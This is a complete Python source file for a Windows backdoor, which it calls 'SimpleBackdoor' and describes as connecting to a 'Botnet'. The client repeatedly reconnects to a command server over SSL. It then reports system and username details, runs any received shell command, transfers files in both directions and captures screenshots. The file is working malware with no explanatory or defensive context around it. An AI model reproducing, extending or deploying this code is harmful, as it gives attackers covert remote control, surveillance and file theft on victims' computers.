import socket
import subprocess
import os
import time
import platform
import pyautogui
import random
import ssl
import sys

COMMAND_RECEIVE_SIZE = 1024 * 256
DATA_RECEIVE_SIZE = 1024 * 1024


class SimpleBackdoor:
    def __init__(self, ServerAddress, ServerPort):

        # SSL Config
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        cert_path = os.path.join(sys._MEIPASS, "certs/cert.pem")
        #cert_path = "certs/cert.pem"
        self.ssl_context.load_verify_locations(cert_path)

        # Computer Info
        self.OS_NAME = platform.system()
        self.MACHINE = platform.machine()
        self.WIN_EDITION = platform.win32_edition()
        self.User = os.environ["username"]
        self.COMPUTER_INFO = f"\nSystem : {self.OS_NAME}\nMachine : {self.MACHINE}\nWin Edition : {self.WIN_EDITION}\n"
        self.COMPUTER_INFO += f"Username : {self.User}\n"
        self.ConSocket = None
        self.SSLSocket = None

        # Initializing Connection to the Botnet
        try:
            self.ServerAddress = ServerAddress
            self.ServerPort = int(ServerPort)
        except Exception as e:
            print(f"[-] Error while initializing client : {e}")
            return

    def infinite_connect(self):
        while True:
            try:
                self.ConSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.ConSocket.connect((self.ServerAddress, self.ServerPort))
                self.SSLSocket = self.ssl_context.wrap_socket(self.ConSocket)
                print("[+] Connected to server...")
                self.start_serving()
                self.ConSocket.close()
                self.SSLSocket.close()
                time.sleep(3)
            except Exception as e:
                print(f"[-] Unable to connect to {self.ServerAddress}:{self.ServerPort} -> {e}")

    def start_serving(self):
        while True:
            print("[+] Waiting for commands...")
            command = self.SSLSocket.recv(COMMAND_RECEIVE_SIZE).decode()
            print(f"[ info ] Command received : {command}")
            if command == "exit" or command == "quit":
                continue
            elif command == "server_exited":
                break
            elif command == "sysinfo":
                self.SSLSocket.sendall(self.COMPUTER_INFO.encode())
            elif command.startswith("cd"):
                folder_name = command[3:]
                try:
                    os.chdir(folder_name)
                    self.SSLSocket.sendall(b"[+] Folder Changed.")
                except Exception as e:
                    self.SSLSocket.sendall(b"[-] Folder does not exist : " + str(e).encode())
            elif command.startswith("download"):
                self.upload(command)
            elif command.startswith("upload"):
                self.download(command)
            elif command == "screenshot":
                self.take_screenshot()
            elif command.endswith("_from_remote_all"):
                os.system(command[:-16])
            else:
                try:
                    process_command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = process_command.stdout.read() + process_command.stderr.read()
                    self.SSLSocket.sendall(output)
                except Exception as e:
                    print(f"[-] Error while running command '{command}' : {e}")

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        temp_folder = os.environ["temp"]
        random_name = "sh" + str(random.randint(10000,1000000))
        full_path = temp_folder+f"\\{random_name}.png"
        screenshot.save(full_path)
        self.upload(f"download {full_path}")
        os.remove(full_path)


    def download(self, command_received):
        # Downloading file from server

        print("[+] Downloading file")
        file_name = command_received[7:]
        file_data = b''

        # Receive File Data

        self.SSLSocket.settimeout(3)
        while True:
            try:
                file_data += self.SSLSocket.recv(DATA_RECEIVE_SIZE)
            except socket.timeout as timeout_exception:
                break

        self.SSLSocket.settimeout(None)

        print("[+] Writing file to disk...")
        with open(file_name, "wb") as new_file:
            new_file.write(file_data)
        print("[+] File has been written :)")

    def upload(self, command_received):
        # Downloading command

        print("Uploading file...")
        file_name = command_received.replace("download ", "")
        with open(file_name, "rb") as file_handle:
            file_data = file_handle.read()

        self.SSLSocket.sendall(file_data)
        print("[+] File sent")


MyBackdoor = SimpleBackdoor("127.0.0.1", 8080)
MyBackdoor.infinite_connect()